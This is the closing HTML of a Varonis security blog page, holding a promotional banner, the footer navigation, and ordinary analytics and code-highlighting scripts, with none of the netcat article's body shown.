+<span class="section-bg to-left" style="background: url(https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/images/bg-rainbow.jpg) center top no-repeat; background-size:unset;">&nbsp;</span>
+<div class="pcenter">
+    <div class="entry">
+        <h3 class="m-title">Does your <strong>cybersecurity</strong> start at the heart?</h3>
+        <div class="intro">Get a highly customized data risk assessment run by engineers who are obsessed with data security. </div>
+        <div class="btn-wrap"><a class="btn c-white demo-btn" title="Schedule now" href="https://info.varonis.com/start">Schedule now</a></div></div>
+    </div>
+</section>
+
+
+
+		</div><!-- .site-content -->
+	</div><!-- .site-inner -->
+
+    <footer id="colophon" class="site-footer" role="contentinfo">
+    <div class="pcenter">
+        <div class="site-info">
+            
+            <span class="site-title footer-logo">
+            <a href="https://www.varonis.com/blog/" rel="home">
+			<img alt="Inside Out Security" title="Inside Out Security" src="https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/images/varonis_Logo.svg" />            </a>
+            </span>
+            
+            <div class="menu-footer-menu-container"><ul id="menu-footer-menu" class="footer-menu"><li id="menu-item-12064" class="varonis menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12064"><a href="https://www.varonis.com/">Varonis</a>
+<ul class="sub-menu">
+	<li id="menu-item-12065" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12065"><a href="https://sites.varonis.com/fr">Français</a></li>
+	<li id="menu-item-12066" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12066"><a href="https://sites.varonis.com/de">Deutsch</a></li>
+	<li id="menu-item-12067" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12067"><a href="http://jp.varonis.com/">日本語</a></li>
+	<li id="menu-item-12068" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12068"><a href="https://sites.varonis.com/ru">Pусский</a></li>
+	<li id="menu-item-12069" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12069"><a href="https://sites.varonis.com/pt-br">Português</a></li>
+</ul>
+</li>
+<li id="menu-item-12070" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12070"><a href="https://www.varonis.com/#">Solutions</a>
+<ul class="sub-menu">
+	<li id="menu-item-12071" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12071"><a href="https://www.varonis.com/products/datadvantage/">Remediation &#038; Governance</a></li>
+	<li id="menu-item-12072" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12072"><a href="https://www.varonis.com/products/datalert">Security Analytics</a></li>
+	<li id="menu-item-12073" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12073"><a href="https://www.varonis.com/products/data-classification-engine/">Data Classification</a></li>
+	<li id="menu-item-12074" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12074"><a href="https://www.varonis.com/solutions/ransomware/">Ransomware</a></li>
+	<li id="menu-item-12075" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12075"><a href="https://info.varonis.com/insider-threats">Insider Threats</a></li>
+	<li id="menu-item-12076" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12076"><a href="https://www.varonis.com/products/edge/">External Threats</a></li>
+</ul>
+</li>
+<li id="menu-item-12077" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12077"><a href="https://www.varonis.com/products/data-security-platform/">Platform</a>
+<ul class="sub-menu">
+	<li id="menu-item-12078" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12078"><a href="https://www.varonis.com/how-it-works/">How It Works</a></li>
+	<li id="menu-item-12079" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12079"><a href="http://info.varonis.com/buy">How to Buy</a></li>
+	<li id="menu-item-12080" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12080"><a href="https://www.varonis.com/operational-journey/">How to Use It</a></li>
+	<li id="menu-item-12081" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12081"><a href="https://www.varonis.com/results/">Real Results</a></li>
+	<li id="menu-item-12082" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12082"><a href="https://info.varonis.com/forrester-tei-study">ROI</a></li>
+	<li id="menu-item-12083" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12083"><a href="https://www.varonis.com/partners/technology-partners/">Integrations</a></li>
+</ul>
+</li>
+<li id="menu-item-12084" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12084"><a href="https://www.varonis.com/company/">Company</a>
+<ul class="sub-menu">
+	<li id="menu-item-12085" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12085"><a href="https://www.varonis.com/company/">About Varonis</a></li>
+	<li id="menu-item-12086" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12086"><a href="https://www.varonis.com/company/varonis-life/">Varonis Life</a></li>
+	<li id="menu-item-12087" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12087"><a href="https://info.varonis.com/careers">Careers</a></li>
+	<li id="menu-item-12088" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12088"><a href="https://www.varonis.com/customers/">Customers</a></li>
+	<li id="menu-item-12089" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12089"><a href="http://ir.varonis.com/">Investor Relations</a></li>
+	<li id="menu-item-12090" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12090"><a href="https://www.varonis.com/company/contact-us/">Contact Us</a></li>
+</ul>
+</li>
+<li id="menu-item-12091" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12091"><a href="https://www.varonis.com/resources/guides/">Resources</a>
+<ul class="sub-menu">
+	<li id="menu-item-12092" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12092"><a href="https://www.varonis.com/free-security-training/">Free Security Training</a></li>
+	<li id="menu-item-12093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12093"><a href="https://www.varonis.com/resources/research/">Analyst Reports</a></li>
+	<li id="menu-item-12094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12094"><a href="https://www.varonis.com/resources/whitepapers">Whitepapers</a></li>
+	<li id="menu-item-12095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12095"><a href="https://www.varonis.com/resources/guides/">Guides</a></li>
+	<li id="menu-item-12096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12096"><a href="https://www.varonis.com/resources/videos/">Videos</a></li>
+	<li id="menu-item-12097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12097"><a href="https://www.varonis.com/events/">Events</a></li>
+</ul>
+</li>
+<li id="menu-item-12098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12098"><a href="https://www.varonis.com/partners/channel-partners/">Partners</a>
+<ul class="sub-menu">
+	<li id="menu-item-12099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12099"><a href="https://www.varonis.com/partners/technology-partners/">Technology Partners</a></li>
+	<li id="menu-item-12100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12100"><a href="https://www.varonis.com/partners/channel-partners/">Channel Partners</a></li>
+	<li id="menu-item-12101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12101"><a href="https://partnercommunity.varonis.com/s/">Partner Portal</a></li>
+</ul>
+</li>
+</ul></div>            
+        </div><!-- .site-info -->
+        
+        <div class="copyrights-media">
+			<p class="copyrights">&copy; 2020 Inside Out Security<span class="divider">&nbsp;|&nbsp;</span><a href="https://www.varonis.com/blog/policies">Policies</a><span class="divider">&nbsp;|&nbsp;</span><a href="https://www.varonis.com/blog/iso-27001-certification">Certifications</a></p>
+            
+                
+        </div>
+        
+    </div>
+    </footer><!-- .site-footer -->
+	
+</div><!-- .site -->
+
+ <script type="text/javascript">
+  analytics.track("Viewed Post", {"title":"How to Use Netcat Commands: Examples and Cheat Sheets","category":"IT Pros","noninteraction":true}, {"library":"analytics-wordpress"});
+    
+</script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/js/skip-link-focus-fix.js?ver=20160412'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/js/functions3.js?ver=20160412'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/plugins/enlighter/resources/mootools-core-yc.js?ver=3.10.0'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=3.10.0'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-includes/js/wp-embed.min.js?ver=5.3.2'></script>
+<script type="text/javascript">/* <![CDATA[ */EnlighterJS_Config = {"selector":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"language":"shell","theme":"atomic","indent":2,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":false,"windowButton":false,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":false,"email":"mail@example.tld"}};!function(){var a=function(a){var b="Enlighter Error: ";console.error?console.error(b+a):console.log&&console.log(b+a)};return window.addEvent?"undefined"==typeof EnlighterJS?void a("Javascript Resources not loaded yet!"):"undefined"==typeof EnlighterJS_Config?void a("Configuration not loaded yet!"):void window.addEvent("domready",function(){EnlighterJS.Util.Init(EnlighterJS_Config.selector.block,EnlighterJS_Config.selector.inline,EnlighterJS_Config)}):void a("MooTools Framework not loaded yet!")}();;/* ]]> */</script>
+<script type="text/javascript">
+    
+    function downloadJSAtOnload() {
+        var element = document.createElement("script");
+        element.src = "https://www.varonis.com/vanalytics.js";
+        document.body.appendChild(element);
+    }
+
+    if (window.addEventListener)
+        window.addEventListener("load", downloadJSAtOnload, false);
+    else if (window.attachEvent)
+        window.attachEvent("onload", downloadJSAtOnload);
+    else window.onload = downloadJSAtOnload;
+
+</script>
+
+</body>
+</html>
